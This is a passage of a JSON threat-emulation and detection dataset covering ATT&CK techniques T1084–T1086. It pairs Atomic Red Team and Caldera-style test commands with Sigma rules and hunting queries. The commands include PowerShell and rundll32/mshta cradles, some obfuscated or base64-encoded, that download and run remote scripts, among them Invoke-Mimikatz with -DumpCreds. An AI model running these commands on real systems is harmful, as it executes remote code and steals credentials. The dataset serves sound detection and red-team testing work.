"falsepositives": ["Unknown (data set is too small; further testing needed)"], "level": "high"}}, {"data_source": {"title": "WMI Backdoor Exchange Transport Agent", "id": "797011dc-44f4-4e6f-9f10-a8ceefbe566b", "status": "experimental", "description": "Detects a WMi backdoor in Exchange Transport Agents via WMi event filters", "author": "Florian Roth", "date": "2019/10/11", "references": ["https://twitter.com/cglyer/status/1182389676876980224", "https://twitter.com/cglyer/status/1182391019633029120"], "logsource": {"category": "process_creation", "product": "windows"}, "tags": ["attack.persistence", "attack.t1084"], "detection": {"selection": {"ParentImage": "*\\EdgeTransport.exe"}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical"}}]}, {"technique_id": "T1085", "commands": [{"source": "atomics/T1085/T1085.yaml", "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct\").Exec();\n", "name": null}, {"source": "atomics/T1085/T1085.yaml", "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)\n", "name": null}, {"source": "atomics/T1085/T1085.yaml", "command": "rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n", "name": null}, {"source": "atomics/T1085/T1085.yaml", "command": "rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n", "name": null}, {"source": "atomics/T1085/T1085.yaml", "command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n", "name": null}, {"source": "atomics/T1085/T1085.yaml", "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n", "name": null}, {"source": "SysmonHunter - Rundll32", "command": "\\\\Windows\\\\.+\\\\rundll32.exevbscript|javascript|http|https|.dll", "name": null}], "parsed_datasets": [{"Atomic Red Team Test - Rundll32": {"attack_technique": "T1085", "display_name": "Rundll32", "atomic_tests": [{"name": "Rundll32 execute JavaScript Remote Payload With GetObject", "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened.\n", "supported_platforms": ["windows"], "input_arguments": {"file_url": {"description": "location of the payload", "type": "Url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:#{file_url}\").Exec();\n"}}, {"name": "Rundll32 execute VBscript command", "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "Command for rundll32.exe to execute", "type": "string", "default": "calc.exe"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n"}}, {"name": "Rundll32 advpack.dll Execution", "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n", "supported_platforms": ["windows"], "input_arguments": {"inf_to_execute": {"description": "Local location of inf file", "type": "string", "default": "PathToAtomicsFolder\\T1085\\src\\T1085.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Inf file must exist on disk at specified location (#{inf_to_execute})\n", "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf\" -OutFile \"#{inf_to_execute}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,\n"}}, {"name": "Rundll32 ieadvpack.dll Execution", "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n", "supported_platforms": ["windows"], "input_arguments": {"inf_to_execute": {"description": "Local location of inf file", "type": "string", "default": "PathToAtomicsFolder\\T1085\\src\\T1085.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Inf file must exist on disk at specified location (#{inf_to_execute})\n", "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf\" -OutFile \"#{inf_to_execute}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,\n"}}, {"name": "Rundll32 syssetup.dll Execution", "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n", "supported_platforms": ["windows"], "input_arguments": {"inf_to_execute": {"description": "Local location of inf file", "type": "string", "default": "PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Inf file must exist on disk at specified location (#{inf_to_execute})\n", "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\\#{inf_to_execute}\n"}}, {"name": "Rundll32 setupapi.dll Execution", "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n", "supported_platforms": ["windows"], "input_arguments": {"inf_to_execute": {"description": "Local location of inf file", "type": "string", "default": "PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Inf file must exist on disk at specified location (#{inf_to_execute})\n", "prereq_command": "if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_to_execute}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf\" -OutFile \"#{inf_to_execute}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\\#{inf_to_execute}\n"}}]}}, {"SysmonHunter - T1085": {"name": "Rundll32", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\rundll32.exe", "flag": "regex"}, "cmdline": {"pattern": "vbscript|javascript|http|https|.dll"}}}]}}], "command_list": ["rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct\").Exec();\n", "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)\n", "rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n", "rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n", "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n", "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n", "\\\\Windows\\\\.+\\\\rundll32.exevbscript|javascript|http|https|.dll"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1and (process_parent_path contains \"\\\\rundll32.exe\"or process_path contains \"rundll32.exe\")", "name": "Rundll32"}], "possible_detections": [{"data_source": {"title": "Equation Group DLL_U Load", "id": "d465d1d8-27a2-4cca-9621-a800f37cf72e", "author": "Florian Roth", "description": "Detects a specific tool and export used by EquationGroup", "references": ["https://github.com/adamcaudill/EquationGroupLeak/search?utf8=%E2%9C%93&q=dll_u&type=", "https://securelist.com/apt-slingshot/84312/", "https://twitter.com/cyb3rops/status/972186477512839170"], "tags": ["attack.execution", "attack.g0020", "attack.t1059", "attack.defense_evasion", "attack.t1085"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"Image": "*\\rundll32.exe", "CommandLine": "*,dll_u"}, "selection2": {"CommandLine": "* -export dll_u *"}, "condition": "1 of them"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "Sofacy Trojan Loader Activity", "id": "ba778144-5e3d-40cf-8af9-e28fb1df1e20", "author": "Florian Roth", "status": "experimental", "description": "Detects Trojan loader acitivty as used by APT28", "references": ["https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/", "https://www.reverse.it/sample/e3399d4802f9e6d6d539e3ae57e7ea9a54610a7c4155a6541df8e94d67af086e?environmentId=100", "https://twitter.com/ClearskySec/status/960924755355369472"], "tags": ["attack.g0007", "attack.execution", "attack.t1059", "attack.defense_evasion", "attack.t1085", "car.2013-10-002"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["rundll32.exe %APPDATA%\\\\*.dat\",*", "rundll32.exe %APPDATA%\\\\*.dll\",#1"]}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "TropicTrooper Campaign November 2018", "id": "8c7090c3-e0a0-4944-bd08-08c3a0cecf79", "author": "@41thexplorer, Windows Defender ATP", "status": "stable", "description": "Detects TropicTrooper activity, an actor who targeted high-profile organizations in the energy and food and beverage sectors in Asia", "references": ["https://cloudblogs.microsoft.com/microsoftsecure/2018/11/28/windows-defender-atp-device-risk-score-exposes-new-cyberattack-drives-conditional-access-to-protect-networks/"], "tags": ["attack.execution", "attack.t1085"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": "*abCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCc*"}, "condition": "selection"}, "level": "high"}}, {"data_source": {"action": "global", "title": "Unidentified Attacker November 2018", "id": "7453575c-a747-40b9-839b-125a0aae324b", "status": "stable", "description": "A sigma rule detecting an unidetefied attacker who used phishing emails to target high profile orgs on November 2018. The Actor shares some TTPs with YYTRIUM/APT29 campaign in 2016.", "references": ["https://twitter.com/DrunkBinary/status/1063075530180886529"], "author": "@41thexplorer, Windows Defender ATP", "date": "2018/11/20", "modified": "2018/12/11", "tags": ["attack.execution", "attack.t1085"], "detection": {"condition": "1 of them"}, "level": "high"}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"CommandLine": "*cyzfc.dat, PointFunctionCall"}}}}, {"data_source": {"logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection2": {"EventID": 11, "TargetFilename": ["*ds7002.lnk*"]}}}}, {"data_source": {"title": "ZxShell Malware", "id": "f0b70adb-0075-43b0-9745-e82a1c608fcc", "description": "Detects a ZxShell start by the called and well-known function name", "author": "Florian Roth", "references": ["https://www.hybrid-analysis.com/sample/5d2a4cde9fa7c2fdbf39b2e2ffd23378d0c50701a3095d1e91e3cf922d7b0b16?environmentId=100"], "tags": ["attack.g0001", "attack.execution", "attack.t1059", "attack.defense_evasion", "attack.t1085"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Command": ["rundll32.exe *,zxFunction*", "rundll32.exe *,RemoteDiskXXXXX"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Unlikely"], "level": "critical"}}, {"data_source": {"title": "Fireball Archer Install", "id": "3d4aebe0-6d29-45b2-a8a4-3dfde586a26d", "status": "experimental", "description": "Detects Archer malware invocation via rundll32", "author": "Florian Roth", "date": "2017/06/03", "references": ["https://www.virustotal.com/en/file/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022/analysis/", "https://www.hybrid-analysis.com/sample/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022?environmentId=100"], "tags": ["attack.execution", "attack.t1059", "attack.defense_evasion", "attack.t1085"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": "*\\rundll32.exe *,InstallArcherSvc"}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Rundll32 Internet Connection", "id": "cdc8da7d-c303-42f8-b08c-b4ab47230263", "status": "experimental", "description": "Detects a rundll32 that communicates with public IP addresses", "references": ["https://www.hybrid-analysis.com/sample/759fb4c0091a78c5ee035715afe3084686a8493f39014aea72dae36869de9ff6?environmentId=100"], "author": "Florian Roth", "date": "2017/11/04", "tags": ["attack.t1085", "attack.defense_evasion", "attack.execution"], "logsource": {"product": "windows", "service": "sysmon"}, "detection": {"selection": {"EventID": 3, "Image": "*\\rundll32.exe", "Initiated": "true"}, "filter": {"DestinationIp": ["10.*", "192.168.*", "172.16.*", "172.17.*", "172.18.*", "172.19.*", "172.20.*", "172.21.*", "172.22.*", "172.23.*", "172.24.*", "172.25.*", "172.26.*", "172.27.*", "172.28.*", "172.29.*", "172.30.*", "172.31.*", "127.*"]}, "condition": "selection and not filter"}, "falsepositives": ["Communication to other corporate systems that use IP addresses from public address spaces"], "level": "medium"}}, {"data_source": {"title": "Suspicious Control Panel DLL Load", "id": "d7eb979b-c2b5-4a6f-a3a7-c87ce6763819", "status": "experimental", "description": "Detects suspicious Rundll32 execution from control.exe as used by Equation Group and Exploit Kits", "author": "Florian Roth", "date": "2017/04/15", "references": ["https://twitter.com/rikvduijn/status/853251879320662017"], "tags": ["attack.defense_evasion", "attack.t1073", "attack.t1085", "car.2013-10-002"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\System32\\control.exe", "CommandLine": "*\\rundll32.exe *"}, "filter": {"CommandLine": "*Shell32.dll*"}, "condition": "selection and not filter"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Suspicious Rundll32 Activity", "id": "e593cf51-88db-4ee1-b920-37e89012a3c9", "description": "Detects suspicious process related to rundll32 based on arguments", "status": "experimental", "references": ["http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/", "https://twitter.com/Hexacorn/status/885258886428725250", "https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52"], "tags": ["attack.defense_evasion", "attack.execution", "attack.t1085"], "author": "juju4", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["*\\rundll32.exe* url.dll,*OpenURL *", "*\\rundll32.exe* url.dll,*OpenURLA *", "*\\rundll32.exe* url.dll,*FileProtocolHandler *", "*\\rundll32.exe* zipfldr.dll,*RouteTheCall *", "*\\rundll32.exe* Shell32.dll,*Control_RunDLL *", "*\\rundll32.exe javascript:*", "* url.dll,*OpenURL *", "* url.dll,*OpenURLA *", "* url.dll,*FileProtocolHandler *", "* zipfldr.dll,*RouteTheCall *", "* Shell32.dll,*Control_RunDLL *", "* javascript:*", "*.RegisterXLL*"]}, "condition": "selection"}, "falsepositives": ["False positives depend on scripts and administrative tools used in the monitored environment"], "level": "medium"}}, {"data_source": {"title": "Suspicious Call by Ordinal", "id": "e79a9e79-eb72-4e78-a628-0e7e8f59e89c", "description": "Detects suspicious calls of DLLs in rundll32.dll exports by ordinal", "status": "experimental", "references": ["https://techtalk.pcmatic.com/2017/11/30/running-dll-files-malware-analysis/", "https://github.com/Neo23x0/DLLRunner", "https://twitter.com/cyb3rops/status/1186631731543236608"], "tags": ["attack.defense_evasion", "attack.execution", "attack.t1085"], "author": "Florian Roth", "date": "2019/10/22", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": "*\\rundll32.exe *,#*"}, "condition": "selection"}, "falsepositives": ["False positives depend on scripts and administrative tools used in the monitored environment", "Windows contol panel elements have been identified as source (mmc)"], "level": "high"}}]}, {"technique_id": "T1086", "commands": [{"source": "atomics/T1086/T1086.yaml", "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "write-host \"Import and Execution of SharpHound.ps1 from PathToAtomicsFolder\\T1086\\src\" -ForegroundColor Cyan\nimport-module PathToAtomicsFolder\\T1086\\src\\SharpHound.ps1\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.xml');$Xml.command.a.execute | IEX\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/mshta.sct').Exec();close()\"\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "powershell.exe -version 2 -Command Write-Host $PSVersion\n", "name": null}, {"source": "atomics/T1086/T1086.yaml", "command": "Add-Content -Path $env:TEMP\\NTFS_ADS.txt -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path $env:TEMP\\NTFS_ADS.txt -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n", "name": null}, {"source": "data/abilities/collection/4d9b079c-9ede-4116-8b14-72ad3a5533af.yml", "command": {"windows": {"psh,pwsh": {"command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, "name": "Capture running processes via PowerShell"}, {"source": "data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml", "command": {"windows": {"psh": {"command": "cmd.exe /c \"net user\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"whoami /priv\" >> C:\\Windows\\temp\\history.log;\ncmd.exe /c \"netstat -ano\" >> C:\\Windows\\temp\\history.log;"}}}, "name": "User enumeration"}, {"source": "data/abilities/collection/702bfdd2-9947-4eda-b551-c3a1ea9a59a2.yml", "command": {"windows": {"psh,pwsh": {"command": "powershell.exe -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log\";"}}}, "name": "System Information Gathering Script"}, {"source": "data/abilities/collection/7c42a30c-c8c7-44c5-80a8-862d364ac1e4.yml", "command": {"windows": {"psh,pwsh": {"command": "echo $(get-uac)\n"}}}, "name": "Determine whether or not UAC is enabled"}, {"source": "data/abilities/defense-evasion/e5f9de8f-3df1-4e78-ad92-a784e3f6770d.yml", "command": {"windows": {"psh": {"command": "Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;\nC:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;\nC:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\n"}}}, "name": "Copy powershell to non-standard location and perform triage commands"}, {"source": "data/abilities/execution/315cedf1-4a3a-4015-b63f-149d64bacbbc.yml", "command": {"windows": {"psh,pwsh": {"command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"\n", "cleanup": "Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\"\n", "payloads": ["Emulate-Administrator-Tasks.ps1"]}}}, "name": "Emulate administrator tasks on a system in a separate process"}, {"source": "data/abilities/execution/bfff9006-d1fb-46ce-b173-92cb04e9a031.yml", "command": {"windows": {"psh": {"command": "powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\"https://bit.ly/33H0QXi\") \n"}}}, "name": "Download"}, {"source": "data/abilities/execution/ccdb8caf-c69e-424b-b930-551969450c57.yml", "command": {"windows": {"psh": {"command": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n"}}}, "name": "Download"}, {"source": "data/abilities/execution/eb814e03-811a-467a-bc6d-dcd453750fa2.yml", "command": {"windows": {"psh": {"command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadFile(\"https://download.sysinternals.com/files/PSTools.zip\", \"PSTools.zip\");\nNew-Item -ItemType \"directory\" C:\\Windows\\System32\\PSTools -Force;\nAdd-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(\"PSTools.zip\", \"C:\\Windows\\System32\\PSTools\");\n"}}}, "name": "Download and install PSTools by unzipping the file"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_2"}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_2"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "powershell.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmd.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": 